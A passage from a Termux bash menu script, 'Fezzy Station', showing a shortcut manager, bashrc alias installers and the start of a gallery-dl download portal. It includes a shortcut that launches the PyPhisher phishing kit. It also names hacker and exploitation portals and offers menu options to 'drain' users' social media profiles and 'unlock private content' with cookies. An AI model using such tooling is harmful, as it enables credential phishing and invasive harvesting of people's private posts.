    printf "  ${YEL}social${RESET}·[8]    ${YEL}books${RESET}·[10]    ${YEL}fileorg${RESET}·[9]\n\n"
    printf "  ${PINK}${BOLD}── SYSTEM SHORTCUTS ───────────────────────────────────────────${RESET}\n"
    printf "  ${YEL}dl${RESET} / ${YEL}fezzy${RESET} / ${YEL}station${RESET}  → Launch Fezzy Station\n"
    printf "  ${YEL}reload${RESET}  → source ~/.bashrc + confirm\n"
    printf "  ${YEL}detox${RESET}   → rm /tmp/fezzy_* + apt autoremove + pkg clean\n"
    printf "  ${YEL}clean${RESET}   → clone + run termux-junk-cleaner\n"
    printf "  ${YEL}crystal${RESET} → Launch PyPhisher\n"
    printf "  ${YEL}pkgup${RESET}   → pkg update -y && pkg upgrade -y\n"
    printf "  ${YEL}myip${RESET}    → Show external IP\n"
    printf "  ${YEL}space${RESET}   → Show storage usage\n"
    printf "  ${YEL}psall${RESET}   → Top 20 running processes\n"
    printf "  ${YEL}sc${RESET}      → This shortcuts screen (type sc anywhere)\n\n"
    printf "  ${FADE}Press ENTER to return...${RESET}"; read -r
}

# 
# SHORTCUT MANAGER — persistent aliases stored in ~/.fezzy_shortcuts
# Format per line: alias_name|command
# 
shortcut_manager() {
    local SF="${SHORTCUTSFILE:-$HOME/.fezzy_shortcuts}"
    touch "$SF" 2>/dev/null

    # ── helpers ───────────────────────────────────────────────────
    _sc_load() {
        mapfile -t _SC_LINES < "$SF" 2>/dev/null
    }
    _sc_save() {
        printf '%s\n' "${_SC_LINES[@]}" > "$SF"
    }
    _sc_list() {
        _sc_load
        if [[ ${#_SC_LINES[@]} -eq 0 ]]; then
            printf "  ${FADE}No shortcuts saved yet — use [1] to add${RESET}\n"
            return
        fi
        local i=1
        for line in "${_SC_LINES[@]}"; do
            local al cmd
            al="${line%%|*}"
            cmd="${line#*|}"
            printf "  ${C20}%2d.${RESET}  ${YEL}%-20s${RESET}  ${FADE}→${RESET}  ${WH}%s${RESET}\n" "$i" "$al" "$cmd"
            ((i++))
        done
    }

    while true; do
        clear
        echo ""
        _dv20
        printf "  ${C20}${BOLD}SHORTCUT MANAGER  —  Fezzy Station · Strategy Over Impulse${RESET}\n"
        _dv20
        echo ""
        _sc_load
        printf "  ${WH}Saved shortcuts (%s):${RESET}\n\n" "${#_SC_LINES[@]}"
        _sc_list
        echo ""
        _dv20
        echo ""
        printf "  ${C20}${BOLD}── MANAGE ─────────────────────────────────────────────────────────${RESET}\n"
        printf "  ${WH}[0]  Show all shortcuts — all portal numbers + word aliases          ${RESET}\n"
        printf "  ${WH}[1]  Add shortcut      — define alias + command                    ${RESET}\n"
        printf "  ${WH}[2]  Edit shortcut     — change command for existing alias         ${RESET}\n"
        printf "  ${WH}[3]  Delete shortcut   — remove by number                         ${RESET}\n"
        printf "  ${WH}[4]  Run shortcut      — execute one directly from the list        ${RESET}\n"
        printf "  ${WH}[5]  Capture last cmd  — save history tail as a named shortcut     ${RESET}\n"
        echo ""
        printf "  ${C20}${BOLD}── DEPLOY ─────────────────────────────────────────────────────────${RESET}\n"
        printf "  ${WH}[6]  Apply to session  — write all shortcuts to ~/.bashrc as aliases${RESET}\n"
        printf "  ${WH}[7]  View portal guide — classic number/keyword portal quick-ref    ${RESET}\n"
        printf "  ${WH}[8]  Copy .bashrc to phone — cp ~/.bashrc to /sdcard/Download/     ${RESET}\n"
        printf "  ${WH}[9]  Set all 30 portal aliases — adds shortcuts for every portal    ${RESET}\n"
        echo ""
        printf "  ${FADE}[b] Back  ·  [m] Main Menu${RESET}\n"
        echo ""
        _dv20
        echo ""
        _hover_hint "news"
        echo ""
        printf "  ${C20}${BOLD}Choice » ${RESET}"
        read -r sc_ch

        case "$sc_ch" in
            0) _show_all_shortcuts ;;
            1)
                echo ""
                printf "  ${WH}Alias name (no spaces, e.g. mydl): ${RESET}"; read -r new_al
                [[ -z "$new_al" ]] && { printf "  ${RED}Empty alias — cancelled${RESET}\n"; sleep 1; continue; }
                if echo "$new_al" | grep -qP '\s'; then
                    printf "  ${RED}Alias cannot contain spaces${RESET}\n"; sleep 1; continue
                fi
                printf "  ${WH}Command (e.g. yt-dlp -x --audio-format mp3): ${RESET}"; read -r new_cmd
                [[ -z "$new_cmd" ]] && { printf "  ${RED}Empty command — cancelled${RESET}\n"; sleep 1; continue; }
                # Check for duplicate
                _sc_load
                local dup=0
                for line in "${_SC_LINES[@]}"; do
                    [[ "${line%%|*}" == "$new_al" ]] && dup=1 && break
                done
                if [[ "$dup" -eq 1 ]]; then
                    printf "  ${YEL}[!] Alias '%s' already exists — use [2] Edit to change it${RESET}\n" "$new_al"
                    sleep 1.5; continue
                fi
                echo "${new_al}|${new_cmd}" >> "$SF"
                printf "  ${GRN}✓ Shortcut saved: %s → %s${RESET}\n" "$new_al" "$new_cmd"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            2)
                echo ""
                _sc_load
                [[ ${#_SC_LINES[@]} -eq 0 ]] && { printf "  ${RED}No shortcuts to edit${RESET}\n"; sleep 1; continue; }
                _sc_list
                echo ""; printf "  ${WH}Number to edit: ${RESET}"; read -r edn
                [[ -z "$edn" || ! "$edn" =~ ^[0-9]+$ ]] && continue
                local eidx=$(( edn - 1 ))
                [[ -z "${_SC_LINES[$eidx]}" ]] && { printf "  ${RED}Invalid number${RESET}\n"; sleep 1; continue; }
                local eal="${_SC_LINES[$eidx]%%|*}"
                local ecmd="${_SC_LINES[$eidx]#*|}"
                printf "  ${FADE}Current command: %s${RESET}\n" "$ecmd"
                printf "  ${WH}New command: ${RESET}"; read -r new_ecmd
                [[ -z "$new_ecmd" ]] && continue
                _SC_LINES[$eidx]="${eal}|${new_ecmd}"
                _sc_save
                printf "  ${GRN}✓ Updated: %s → %s${RESET}\n" "$eal" "$new_ecmd"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            3)
                echo ""
                _sc_load
                [[ ${#_SC_LINES[@]} -eq 0 ]] && { printf "  ${RED}No shortcuts to delete${RESET}\n"; sleep 1; continue; }
                _sc_list
                echo ""; printf "  ${WH}Number to delete: ${RESET}"; read -r deln
                [[ -z "$deln" || ! "$deln" =~ ^[0-9]+$ ]] && continue
                local didx=$(( deln - 1 ))
                [[ -z "${_SC_LINES[$didx]}" ]] && { printf "  ${RED}Invalid number${RESET}\n"; sleep 1; continue; }
                local dal="${_SC_LINES[$didx]%%|*}"
                printf "  ${YEL}Delete '%s'? [y/n]: ${RESET}" "$dal"; read -r dconf
                if [[ "$dconf" == "y" || "$dconf" == "Y" ]]; then
                    unset '_SC_LINES[$didx]'
                    _SC_LINES=("${_SC_LINES[@]}")
                    _sc_save
                    printf "  ${GRN}✓ Deleted: %s${RESET}\n" "$dal"
                else
                    printf "  ${FADE}Cancelled${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            4)
                echo ""
                _sc_load
                [[ ${#_SC_LINES[@]} -eq 0 ]] && { printf "  ${RED}No shortcuts to run${RESET}\n"; sleep 1; continue; }
                _sc_list
                echo ""; printf "  ${WH}Number to run: ${RESET}"; read -r runn
                [[ -z "$runn" || ! "$runn" =~ ^[0-9]+$ ]] && continue
                local ridx=$(( runn - 1 ))
                [[ -z "${_SC_LINES[$ridx]}" ]] && { printf "  ${RED}Invalid${RESET}\n"; sleep 1; continue; }
                local rcmd="${_SC_LINES[$ridx]#*|}"
                echo ""
                printf "  ${C20}[*] Running: %s${RESET}\n\n" "$rcmd"
                eval "$rcmd"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            5)
                echo ""
                local last_cmd; last_cmd=$(fc -ln -2 -1 2>/dev/null | tail -1 | sed 's/^[[:space:]]*//' || history 2 | tail -1 | sed 's/^[[:space:]]*[0-9]*[[:space:]]*//')
                if [[ -z "$last_cmd" ]]; then
                    printf "  ${RED}Could not retrieve last command${RESET}\n"; sleep 1; continue
                fi
                printf "  ${FADE}Last command: %s${RESET}\n\n" "$last_cmd"
                printf "  ${WH}Save as alias (e.g. scanhome): ${RESET}"; read -r cap_al
                [[ -z "$cap_al" ]] && continue
                echo "${cap_al}|${last_cmd}" >> "$SF"
                printf "  ${GRN}✓ Captured: %s → %s${RESET}\n" "$cap_al" "$last_cmd"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            6)
                echo ""
                _sc_load
                [[ ${#_SC_LINES[@]} -eq 0 ]] && { printf "  ${YEL}No shortcuts to apply${RESET}\n"; sleep 1; continue; }
                printf "  ${C20}[*] Writing shortcuts to ~/.bashrc...${RESET}\n\n"
                # Remove old fezzy shortcut block if present
                sed -i '/# === FEZZY SHORTCUTS START ===/,/# === FEZZY SHORTCUTS END ===/d' ~/.bashrc 2>/dev/null
                {
                    echo "# === FEZZY SHORTCUTS START ==="
                    for line in "${_SC_LINES[@]}"; do
                        local al="${line%%|*}"
                        local cmd="${line#*|}"
                        echo "alias ${al}='${cmd}'"
                    done
                    echo "# === FEZZY SHORTCUTS END ==="
                } >> ~/.bashrc
                printf "  ${GRN}✓ %s shortcut(s) written to ~/.bashrc${RESET}\n" "${#_SC_LINES[@]}"
                printf "  ${FADE}Run: source ~/.bashrc  to activate now${RESET}\n"
                printf "  ${WH}Apply now? [y/n]: ${RESET}"; read -r apconf
                [[ "$apconf" == "y" || "$apconf" == "Y" ]] && source ~/.bashrc 2>/dev/null && printf "  ${GRN}✓ Applied to current session${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            7)
                # Classic shortcuts guide (read-only reference)
                clear
                echo ""
                _dv20
                printf "  ${C20}${BOLD}FEZZY PORTALS v1 Enhanced  —  PORTAL QUICK REFERENCE${RESET}\n"
                _dv20
                echo ""
                printf "  ${WH}TYPE ANY OF THESE TO JUMP DIRECT TO A PORTAL:${RESET}\n"
                echo ""
                printf "  ${C1}gallery   ${FADE}or${RESET}  ${C1}1${RESET}     ${FADE}→ Gallery Portal${RESET}\n"
                printf "  ${C2}music     ${FADE}or${RESET}  ${C2}2${RESET}     ${FADE}→ Music Portal${RESET}\n"
                printf "  ${C3}video     ${FADE}or${RESET}  ${C3}3${RESET}     ${FADE}→ Video Portal${RESET}\n"
                printf "  ${C4}grab      ${FADE}or${RESET}  ${C4}4${RESET}     ${FADE}→ Web Grab Portal${RESET}\n"
                printf "  ${C5}search    ${FADE}or${RESET}  ${C5}5${RESET}     ${FADE}→ Search Portal${RESET}\n"
                printf "  ${C6}tools     ${FADE}or${RESET}  ${C6}6${RESET}     ${FADE}→ Tool Portal${RESET}\n"
                printf "  ${C7}jw        ${FADE}or${RESET}  ${C7}7${RESET}     ${FADE}→ Juice WRLD Portal${RESET}\n"
                printf "  ${C8}social    ${FADE}or${RESET}  ${C8}8${RESET}     ${FADE}→ Social OSINT Portal${RESET}\n"
                printf "  ${C9}organizer ${FADE}or${RESET}  ${C9}9${RESET}     ${FADE}→ Smart File Organizer${RESET}\n"
                printf "  ${C10}books     ${FADE}or${RESET}  ${C10}10${RESET}    ${FADE}→ Books Portal${RESET}\n"
                printf "  ${C11}hacker    ${FADE}or${RESET}  ${C11}11${RESET}    ${FADE}→ Hacker Portal${RESET}\n"
                printf "  ${C12}pdf       ${FADE}or${RESET}  ${C12}12${RESET}    ${FADE}→ PDF Portal${RESET}\n"
                printf "  ${C13}notes     ${FADE}or${RESET}  ${C13}13${RESET}    ${FADE}→ Note Editor${RESET}\n"
                printf "  ${C14}android   ${FADE}or${RESET}  ${C14}14${RESET}    ${FADE}→ Android Bridge${RESET}\n"
                printf "  ${C15}dlm       ${FADE}or${RESET}  ${C15}15${RESET}    ${FADE}→ Download Manager${RESET}\n"
                printf "  ${C16}clip      ${FADE}or${RESET}  ${C16}16${RESET}    ${FADE}→ Clipboard Manager${RESET}\n"
                printf "  ${C17}notifs    ${FADE}or${RESET}  ${C17}17${RESET}    ${FADE}→ Notifications Hub${RESET}\n"
                printf "  ${C18}research  ${FADE}or${RESET}  ${C18}18${RESET}    ${FADE}→ Research Portal${RESET}\n"
                printf "  ${C19}git       ${FADE}or${RESET}  ${C19}19${RESET}    ${FADE}→ GitHub Portal${RESET}\n"
                printf "  ${C20}news      ${FADE}or${RESET}  ${C20}20${RESET}    ${FADE}→ News Portal${RESET}\n"
                printf "  ${C21}fhacker   ${FADE}or${RESET}  ${C21}21${RESET}    ${FADE}→ Exploitation Portal${RESET}\n"
                printf "  ${C22}encrypt   ${FADE}or${RESET}  ${C22}22${RESET}    ${FADE}→ Encryption Vault${RESET}\n"
                printf "  ${C23}torrent   ${FADE}or${RESET}  ${C23}23${RESET}    ${FADE}→ Torrent Portal${RESET}\n"
                printf "  ${C24}desktop   ${FADE}or${RESET}  ${C24}24${RESET}    ${FADE}→ Termux Desktop Portal${RESET}\n"
                printf "  ${C25}filemgr   ${FADE}or${RESET}  ${C25}25${RESET}    ${FADE}→ File Manager Portal${RESET}\n"
                printf "  ${C26}shortcuts ${FADE}or${RESET}  ${C26}26${RESET}    ${FADE}→ Shortcut Builder Portal${RESET}\n"
                printf "  ${C27}foss      ${FADE}or${RESET}  ${C27}27${RESET}    ${FADE}→ FOSS App Discovery${RESET}\n"
                printf "  ${C28}encyclopedia ${FADE}or${RESET}  ${C28}28${RESET} ${FADE}→ Termux Encyclopedia${RESET}\n"
                printf "  ${C29}artist    ${FADE}or${RESET}  ${C29}29${RESET}    ${FADE}→ Fezzy Artist Portal${RESET}\n"
                printf "  ${C30}player    ${FADE}or${RESET}  ${C30}30${RESET}    ${FADE}→ Local Music Player${RESET}\n"
                echo ""
                printf "  ${HOT}sc${RESET}               ${FADE}→ Shortcut Manager (this screen)${RESET}\n"
                printf "  ${HOT}k9${RESET}               ${FADE}→ Bojack Security Report${RESET}\n"
                printf "  ${HOT}q${RESET}                ${FADE}→ Exit Fezzy Portals${RESET}\n"
                echo ""
                _dv20
                echo ""
                printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            8)
                echo ""
                printf "  ${C20}[*] Copying ~/.bashrc to /sdcard/Download/bashrc_backup_$(date +%Y%m%d_%H%M%S).txt...${RESET}\n\n"
                local bkname="/sdcard/Download/bashrc_backup_$(date +%Y%m%d_%H%M%S).txt"
                cp ~/.bashrc "$bkname" 2>/dev/null \
                    && printf "  ${GRN}✓ Saved to phone: %s${RESET}\n" "$bkname" \
                    || printf "  ${RED}✗ Copy failed — is Termux storage set up? Run: termux-setup-storage${RESET}\n"
                echo ""
                printf "  ${FADE}Also copying shortcut list...${RESET}\n"
                cp "$SF" "/sdcard/Download/fezzy_shortcuts_$(date +%Y%m%d_%H%M%S).txt" 2>/dev/null \
                    && printf "  ${GRN}✓ Shortcuts list also backed up to /sdcard/Download/${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            9)
                echo ""
                printf "  ${C20}[*] Writing all 30 portal aliases to ~/.bashrc...${RESET}\n\n"
                local _scr="$HOME/fezzy_station_v60.sh"
                local portal_aliases=(
                    "alias gallery='echo \"  ◈  Gallery Portal [1] · SOI · 999\" && FEZZY_DIRECT=1 bash $_scr'"
                    "alias music='echo \"  ◈  Music Portal [2] · SOI · 999\" && FEZZY_DIRECT=2 bash $_scr'"
                    "alias video='echo \"  ◈  Video Portal [3] · SOI · 999\" && FEZZY_DIRECT=3 bash $_scr'"
                    "alias webgrab='echo \"  ◈  WebGrab Portal [4] · SOI · 999\" && FEZZY_DIRECT=4 bash $_scr'"
                    "alias srch='echo \"  ◈  Search Portal [5] · SOI · 999\" && FEZZY_DIRECT=5 bash $_scr'"
                    "alias tools='echo \"  ◈  Tools Portal [6] · SOI · 999\" && FEZZY_DIRECT=6 bash $_scr'"
                    "alias juice='echo \"  ◈  Juice WRLD Portal [7] · SOI · 999\" && FEZZY_DIRECT=7 bash $_scr'"
                    "alias social='echo \"  ◈  Social Portal [8] · SOI · 999\" && FEZZY_DIRECT=8 bash $_scr'"
                    "alias fileorg='echo \"  ◈  File Organizer Portal [9] · SOI · 999\" && FEZZY_DIRECT=9 bash $_scr'"
                    "alias books='echo \"  ◈  Books Portal [10] · SOI · 999\" && FEZZY_DIRECT=10 bash $_scr'"
                    "alias hacker='echo \"  ◈  Hacker Portal [11] · SOI · 999\" && FEZZY_DIRECT=11 bash $_scr'"
                    "alias pdfportal='echo \"  ◈  PDF Portal [12] · SOI · 999\" && FEZZY_DIRECT=12 bash $_scr'"
                    "alias note='echo \"  ◈  Documents Portal [13] · SOI · 999\" && FEZZY_DIRECT=13 bash $_scr'"
                    "alias android='echo \"  ◈  Android Bridge Portal [14] · SOI · 999\" && FEZZY_DIRECT=14 bash $_scr'"
                    "alias dlmanager='echo \"  ◈  Download Manager Portal [15] · SOI · 999\" && FEZZY_DIRECT=15 bash $_scr'"
                    "alias clip='echo \"  ◈  Clipboard Portal [16] · SOI · 999\" && FEZZY_DIRECT=16 bash $_scr'"
                    "alias notifs='echo \"  ◈  Notifications Portal [17] · SOI · 999\" && FEZZY_DIRECT=17 bash $_scr'"
                    "alias research='echo \"  ◈  Research Portal [18] · SOI · 999\" && FEZZY_DIRECT=18 bash $_scr'"
                    "alias ghub='echo \"  ◈  GitHub Portal [19] · SOI · 999\" && FEZZY_DIRECT=19 bash $_scr'"
                    "alias news='echo \"  ◈  News Portal [20] · SOI · 999\" && FEZZY_DIRECT=20 bash $_scr'"
                    "alias fhacker='echo \"  ◈  Exploitation Portal [21] · SOI · 999\" && FEZZY_DIRECT=21 bash $_scr'"
                    "alias encrypt='echo \"  ◈  Encryption Vault Portal [22] · SOI · 999\" && FEZZY_DIRECT=22 bash $_scr'"
                    "alias torrent='echo \"  ◈  Torrent Portal [23] · SOI · 999\" && FEZZY_DIRECT=23 bash $_scr'"
                    "alias desktop='echo \"  ◈  Desktop Portal [24] · SOI · 999\" && FEZZY_DIRECT=24 bash $_scr'"
                    "alias filemgr='echo \"  ◈  File Manager Portal [25] · SOI · 999\" && FEZZY_DIRECT=25 bash $_scr'"
                    "alias shortcuts='echo \"  ◈  Shortcuts Portal [26] · SOI · 999\" && FEZZY_DIRECT=26 bash $_scr'"
                    "alias foss='echo \"  ◈  FOSS Portal [27] · SOI · 999\" && FEZZY_DIRECT=27 bash $_scr'"
                    "alias encyclopedia='echo \"  ◈  Encyclopedia Portal [28] · SOI · 999\" && FEZZY_DIRECT=28 bash $_scr'"
                    "alias artist='echo \"  ◈  Artist Portal [29] · SOI · 999\" && FEZZY_DIRECT=29 bash $_scr'"
                    "alias player='echo \"  ◈  Music Player Portal [30] · SOI · 999\" && FEZZY_DIRECT=30 bash $_scr'"
                )
                sed -i '/^alias gallery=\|^alias music=\|^alias video=\|^alias webgrab=\|^alias srch=\|^alias tools=\|^alias juice=\|^alias social=\|^alias fileorg=\|^alias books=\|^alias hacker=\|^alias pdfportal=\|^alias note=\|^alias android=\|^alias dlmanager=\|^alias clip=\|^alias notifs=\|^alias research=\|^alias ghub=\|^alias news=\|^alias fhacker=\|^alias encrypt=\|^alias torrent=\|^alias desktop=\|^alias filemgr=\|^alias shortcuts=\|^alias foss=\|^alias encyclopedia=\|^alias artist=\|^alias player=/d' ~/.bashrc 2>/dev/null
                for al in "${portal_aliases[@]}"; do
                    echo "$al" >> ~/.bashrc
                    local aname="${al%%=*}"; aname="${aname#alias }"
                    printf "  ${GRN}✓${RESET} ${WH}%s${RESET}\n" "$aname"
                done
                echo ""
                printf "  ${GRN}✓ All 30 portal aliases written${RESET}\n"
                printf "  ${FADE}Run: source ~/.bashrc to activate${RESET}\n"
                printf "  ${YEL}Note: tools must be installed for each portal to work.${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            b|B) return 0 ;;
            m|M) media_station_portal; return ;;
            *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
        esac
    done
}

# Legacy alias — keep [sc] working
shortcuts_guide() { shortcut_manager; }

# 
# INSTALL PERMANENT
# 
_install_permanent() {
    clear
    echo ""
    _dv
    printf "  ${HOT}${BOLD}INSTALL FEZZY PORTALS V1 ENHANCED PERMANENTLY${RESET}\n"
    _dv
    echo ""
    printf "  ${WH}This will add Fezzy Station to your .bashrc so it loads automatically${RESET}\n"
    printf "  ${WH}on every Termux session. The boot sequence will run once per session.${RESET}\n"
    echo ""
    printf "  ${FADE}Installation command:${RESET}\n"
    printf "  ${CY}echo 'source ~/fezzy_station_v63.sh' >> ~/.bashrc${RESET}\n"
    echo ""
    _dv
    echo ""
    printf "  ${YEL}Install now? [y/n]: ${RESET}"
    read -r confirm
    
    if [[ "$confirm" == "y" || "$confirm" == "Y" ]]; then
        if grep -q "fezzy_station_v63.sh" ~/.bashrc 2>/dev/null; then
            printf "\n  ${YEL}Already installed in .bashrc${RESET}\n"
        else
            echo 'source ~/fezzy_station_v63.sh' >> ~/.bashrc
            printf "\n  ${GRN}✓ Installed successfully${RESET}\n"
            printf "  ${WH}Fezzy Portals V1 Enhanced will load on every new session${RESET}\n"
        fi
    else
        printf "\n  ${FADE}Installation cancelled${RESET}\n"
    fi
    
    echo ""
    printf "  ${FADE}Press ENTER...${RESET}"
    read -r
}

# ═══════════════════════════════════════════════════════════════════
#  [1] GALLERY PORTAL
# ═══════════════════════════════════════════════════════════════════

gallery_portal() {
    while true; do
        clear
        _portal_entry "Gallery Portal" "${C1}"
        echo ""
        _dv1
        printf "  ${C1}${BOLD}GALLERY PORTAL  —  Rip Everything · Full Page Grabs  ${RESET}\n"
        _dv1
        echo ""
        printf "  ${WH}gallery-dl · yt-dlp thumbnail · ~/storage/downloads/gallery${RESET}\n"
        printf "  ${FADE}■ They posted it thinking it was safe · we pulled the whole page before the wifi even blinked${RESET}\n"
        echo ""
        _gallery_autoscan
        _dv1
        echo ""
        printf "  ${WH}[1]  Paste URL — auto rip everything gallery-dl finds                ${RESET}\n"
        printf "  ${WH}[2]  Facebook — cookie auth unlocks private content                  ${RESET}\n"
        printf "  ${WH}[3]  Instagram — cookie auth unlocks private content                 ${RESET}\n"
        printf "  ${WH}[4]  Bulk URL file — one URL per line, mass operation                ${RESET}\n"
        printf "  ${WH}[5]  Artwork only — cover art and thumbnails, no media               ${RESET}\n"
        printf "  ${WH}[6]  Twitter / X — posts, threads and profiles                       ${RESET}\n"
        printf "  ${WH}[7]  Reddit — posts and full subreddit galleries                     ${RESET}\n"
        printf "  ${WH}[8]  Pinterest — boards and pins                                     ${RESET}\n"
        printf "  ${WH}[9]  Tumblr — blog and tag galleries                                 ${RESET}\n"
        printf "  ${WH}[10] By username — drain Instagram/Twitter/TikTok/Reddit             ${RESET}\n"
        printf "  ${WH}[11] Browse Downloaded — list files in gallery vault                 ${RESET}\n"
        printf "  ${C1}[12] Instagram Bulk — paste multiple profiles, auto-folder per user  ${RESET}\n"
        printf "  ${C1}[13] Pinterest Bulk — paste boards/pins, auto-organize by board      ${RESET}\n"
        printf "  ${C1}[14] Auto-Organize Vault — sort gallery by source domain             ${RESET}\n"
        printf "  ${C1}[15] Flickr — download public photo albums by URL or username       ${RESET}\n"
        printf "  ${C1}[16] DeviantArt — pull gallery pages and artist uploads             ${RESET}\n"
        printf "  ${C1}[17] EXIF Viewer — read metadata from any image in vault             ${RESET}\n"
        printf "  ${C1}[18] Strip EXIF — wipe metadata from all images in vault            ${RESET}\n"
        printf "  ${C1}[19] Video to GIF — convert video clip to palette-optimised GIF     ${RESET}\n"
        printf "  ${C1}[20] Mass Resize — bulk resize all images to target width           ${RESET}\n"
        printf "  ${C1}[21] View in Android — open any gallery image in Android viewer     ${RESET}\n"
        printf "  ${C1}[22] Quick Browse — list images · pick number · open in Android     ${RESET}\n"
        echo ""
        printf "  ${FADE}[b] Back  ·  [m] Main Menu  ·  [Z] Install gallery packages${RESET}\n"
        echo ""
        _dv1
        echo ""
        _hover_hint "gallery"
        echo ""
        printf "  ${C1}${BOLD}Choice » ${RESET}"
        read -r ch
        
        case "$ch" in
            1)
                echo ""; printf "  ${WH}Paste URL: ${RESET}"; read -r url
                [[ -z "$url" ]] && continue
                echo ""
                printf "  ${C1}[*] Ripping with gallery-dl...${RESET}\n\n"
                gallery-dl --cookies "$COOKIES_FILE" -d "$GALDIR" "$url"
                echo ""; printf "  ${GRN}✓ Done — check $GALDIR${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            2)
                echo ""; printf "  ${WH}Facebook URL: ${RESET}"; read -r url
                [[ -z "$url" ]] && continue
                echo ""
                printf "  ${C1}[*] Facebook download (requires cookies.txt)...${RESET}\n\n"
                gallery-dl --cookies "$COOKIES_FILE" -d "$GALDIR/facebook" "$url"
                echo ""; printf "  ${GRN}✓ Done${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            3)
                echo ""; printf "  ${WH}Instagram URL: ${RESET}"; read -r url
                [[ -z "$url" ]] && continue
                echo ""
                printf "  ${C1}[*] Instagram download (requires cookies.txt)...${RESET}\n\n"
                gallery-dl --cookies "$COOKIES_FILE" -d "$GALDIR/instagram" "$url"
                echo ""; printf "  ${GRN}✓ Done${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            4)
                echo ""; printf "  ${WH}Path to URL file: ${RESET}"; read -r urlfile
                [[ ! -f "$urlfile" ]] && { printf "  ${RED}File not found${RESET}\n"; sleep 1; continue; }
                echo ""
                printf "  ${C1}[*] Bulk ripping from file...${RESET}\n\n"
                while IFS= read -r url; do
                    [[ -z "$url" ]] && continue
                    printf "  ${C1}→${RESET} %s\n" "$url"
                    gallery-dl --cookies "$COOKIES_FILE" -d "$GALDIR" "$url"
                done < "$urlfile"
                echo ""; printf "  ${GRN}✓ All done${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            5)
                echo ""; printf "  ${WH}Paste URL: ${RESET}"; read -r url
                [[ -z "$url" ]] && continue
                echo ""
                printf "  ${C1}[*] Downloading artwork/thumbnails only...${RESET}\n\n"
                yt-dlp --write-thumbnail --skip-download -o "$GALDIR/%(title)s.%(ext)s" "$url"
                echo ""; printf "  ${GRN}✓ Artwork saved${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            6)
                echo ""; printf "  ${WH}Twitter/X URL: ${RESET}"; read -r url
                [[ -z "$url" ]] && continue
                echo ""
                printf "  ${C1}[*] Twitter/X download...${RESET}\n\n"
                gallery-dl --cookies "$COOKIES_FILE" -d "$GALDIR/twitter" "$url"
                echo ""; printf "  ${GRN}✓ Done${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            7)
                echo ""; printf "  ${WH}Reddit URL: ${RESET}"; read -r url
                [[ -z "$url" ]] && continue
                echo ""
                printf "  ${C1}[*] Reddit gallery download...${RESET}\n\n"
                gallery-dl --cookies "$COOKIES_FILE" -d "$GALDIR/reddit" "$url"
                echo ""; printf "  ${GRN}✓ Done${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            8)
                echo ""; printf "  ${WH}Pinterest URL: ${RESET}"; read -r url
                [[ -z "$url" ]] && continue
                echo ""
                printf "  ${C1}[*] Pinterest download...${RESET}\n\n"
                gallery-dl --cookies "$COOKIES_FILE" -d "$GALDIR/pinterest" "$url"
                echo ""; printf "  ${GRN}✓ Done${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            9)
                echo ""; printf "  ${WH}Tumblr URL: ${RESET}"; read -r url
                [[ -z "$url" ]] && continue
                echo ""
                printf "  ${C1}[*] Tumblr download...${RESET}\n\n"
                gallery-dl --cookies "$COOKIES_FILE" -d "$GALDIR/tumblr" "$url"
                echo ""; printf "  ${GRN}✓ Done${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            10)
                echo ""
                printf "  ${WH}[1] Instagram  [2] Twitter  [3] TikTok  [4] Reddit${RESET}\n"
                printf "  ${WH}Platform: ${RESET}"; read -r platform
                echo ""; printf "  ${WH}Username: ${RESET}"; read -r username
                [[ -z "$username" ]] && continue
                echo ""
                
                case "$platform" in
                    1) url="https://www.instagram.com/$username/" ;;
                    2) url="https://twitter.com/$username" ;;
                    3) url="https://www.tiktok.com/@$username" ;;
                    4) url="https://www.reddit.com/user/$username" ;;
                    *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7; continue ;;
                esac
                
                printf "  ${C1}[*] Draining %s...${RESET}\n\n" "$username"
                gallery-dl --cookies "$COOKIES_FILE" -d "$GALDIR/$username" "$url"
                echo ""; printf "  ${GRN}✓ Done — check $GALDIR/$username${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            11)
                echo ""
                printf "  ${C1}[*] Gallery Vault Contents:${RESET}\n\n"
                local total; total=$(find "$GALDIR" -type f 2>/dev/null | wc -l)
                printf "  ${WH}Total files: %s${RESET}\n\n" "$total"
                mapfile -t subdirs < <(find "$GALDIR" -mindepth 1 -maxdepth 1 -type d 2>/dev/null | sort)
                if [[ ${#subdirs[@]} -gt 0 ]]; then
                    for s in "${subdirs[@]}"; do
                        local n; n=$(find "$s" -type f 2>/dev/null | wc -l)
                        printf "  ${C1}%-25s${RESET} ${WH}%s file(s)${RESET}\n" "$(basename "$s")" "$n"
                    done 2>/dev/null
                fi
                local root_files; root_files=$(find "$GALDIR" -maxdepth 1 -type f 2>/dev/null | wc -l)
                [[ "$root_files" -gt 0 ]] && printf "  ${C1}%-25s${RESET} ${WH}%s file(s)${RESET}\n" "[root]" "$root_files"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            12)
                echo ""
